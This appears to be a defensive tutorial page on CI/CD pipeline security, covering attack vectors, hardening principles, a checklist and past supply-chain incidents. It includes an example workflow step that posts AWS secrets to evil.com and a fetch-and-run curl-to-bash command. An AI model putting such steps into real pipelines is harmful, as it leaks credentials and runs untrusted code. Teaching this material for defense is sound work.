---
title: 'Pipeline Security Fundamentals'
description: 'Understand CI/CD pipeline threats, attack vectors, and core security principles for protecting your build infrastructure.'
---

Before hardening your pipelines, you need to understand how attackers think about them. This section covers the threat landscape, common attack vectors, and foundational security principles.

## The CI/CD Attack Surface

Your pipeline has multiple attack surfaces:

```
Pipeline Attack Surface
=======================

[Source Code]      -> Repository access, malicious commits
[Dependencies]     -> Compromised packages, typosquatting
[CI Configuration] -> Pipeline injection, privilege escalation
[Build Environment]-> Runner compromise, container escape
[Secrets]          -> Credential theft, exposure in logs
[Artifacts]        -> Tampering, malicious injection
[Deployment]       -> Unauthorized access, configuration drift
```

Each component presents opportunities for attackers to inject malicious code, steal credentials, or gain persistent access.

## Common Attack Vectors

### 1. Dependency Confusion / Substitution

Attackers publish malicious packages with names similar to internal packages:

```yaml
# Attacker publishes 'company-internal-utils' to public npm
# Your pipeline pulls the malicious version instead of internal one
dependencies:
  company-internal-utils: "^1.0.0"  # Which registry?
```

**Defenses:**
- Use scoped packages (@company/package-name)
- Configure registry priorities explicitly
- Pin dependencies with lockfiles and integrity hashes

### 2. Pipeline Injection via Pull Requests

Attackers modify CI configuration in PRs to exfiltrate secrets:

```yaml
# Malicious PR modifies .github/workflows/ci.yml
jobs:
  build:
    steps:
      - name: Exfiltrate secrets
        run: |
          curl -X POST https://evil.com/collect \
            -d "secrets=${{ secrets.AWS_ACCESS_KEY }}"
```

**Defenses:**
- Require approval for workflow changes
- Use pull_request_target carefully (runs with base branch secrets)
- Restrict secret access to specific branches

### 3. Compromised Build Tools

Attackers compromise tools that run during builds:

```bash
# Codecov bash uploader was compromised in 2021
# This innocent-looking command exfiltrated secrets
bash <(curl -s https://codecov.io/bash)
```

**Defenses:**
- Pin versions of external scripts
- Verify checksums before execution
- Use official actions/integrations when available

### 4. Artifact Poisoning

Attackers tamper with build artifacts between build and deployment:

```
Build Server -> [Artifact Storage] -> Production
                      ^
                      |
               Attacker modifies
               artifact here
```

**Defenses:**
- Sign artifacts cryptographically
- Verify signatures before deployment
- Use immutable artifact storage

## Security Principles for Pipelines

### Principle 1: Least Privilege

Grant minimum permissions required for each job:

```yaml
# GitHub Actions - explicit permissions
jobs:
  build:
    permissions:
      contents: read      # Only read source code
      packages: write     # Write to package registry
    steps:
      - uses: actions/checkout@v4
```

```yaml
# Bad - excessive permissions
jobs:
  build:
    permissions: write-all  # Never do this
```

### Principle 2: Defense in Depth

Layer multiple security controls:

```
Defense Layers
--------------

Layer 1: Repository protection (branch rules, CODEOWNERS)
Layer 2: Pipeline configuration validation
Layer 3: Secret management (vault, rotation)
Layer 4: Runner isolation (containers, VMs)
Layer 5: Artifact signing and verification
Layer 6: Deployment approval gates
```

No single control is perfect. Multiple layers ensure that bypassing one doesn't compromise everything.

### Principle 3: Immutability

Build artifacts should be immutable once created:

```yaml
# Good - immutable tags
docker build -t myapp:${{ github.sha }} .
docker push myapp:${{ github.sha }}

# Bad - mutable tags
docker build -t myapp:latest .  # Can be overwritten
```

### Principle 4: Auditability

Log everything for forensic analysis:

```yaml
# Capture build metadata
- name: Record build provenance
  run: |
    echo "Commit: ${{ github.sha }}" >> build-info.txt
    echo "Actor: ${{ github.actor }}" >> build-info.txt
    echo "Workflow: ${{ github.workflow }}" >> build-info.txt
    echo "Run ID: ${{ github.run_id }}" >> build-info.txt
```

### Principle 5: Fail Securely

When something goes wrong, fail closed:

```yaml
# Fail the build if security scan fails
- name: Security scan
  run: |
    trivy image myapp:${{ github.sha }} --exit-code 1
    # Non-zero exit fails the build
```

## Pipeline Security Checklist

Use this checklist to assess your pipeline security:

```
[ ] Explicit permissions defined for each job
[ ] Secrets not accessible from PR builds
[ ] Dependencies pinned with lockfiles
[ ] External scripts verified before execution
[ ] Artifact signing implemented
[ ] Branch protection rules enforced
[ ] CODEOWNERS for sensitive files (.github/, Dockerfile, etc.)
[ ] Audit logs enabled and monitored
[ ] Runner environments are ephemeral
[ ] Network access restricted from runners
```

## Real-World Attack Examples

### SolarWinds (2020)

Attackers compromised the build system to inject malicious code:

- Gained access to SolarWinds build infrastructure
- Modified build process to inject backdoor into Orion software
- Signed malicious builds with legitimate certificates
- 18,000+ organizations affected, including US government agencies

**Lessons:**
- Build systems need the same protection as production
- Code signing alone doesn't prevent supply chain attacks
- Monitor build processes for unauthorized modifications

### Codecov (2021)

Attackers modified a bash script used by thousands of repositories:

- Compromised Codecov's Docker image creation process
- Modified bash uploader to exfiltrate environment variables
- Affected ~29,000 customers over 2 months
- Secrets from CI environments were stolen

**Lessons:**
- Verify integrity of external scripts
- Don't expose all environment variables to external tools
- Pin versions of CI integrations

### event-stream (2018)

Social engineering attack on npm package maintainer:

- Attacker offered to maintain popular package
- Added malicious dependency targeting specific application
- Attempted to steal cryptocurrency from Copay wallet users

**Lessons:**
- Review dependency changes carefully
- Be cautious about transferring package ownership
- Monitor for unexpected transitive dependencies
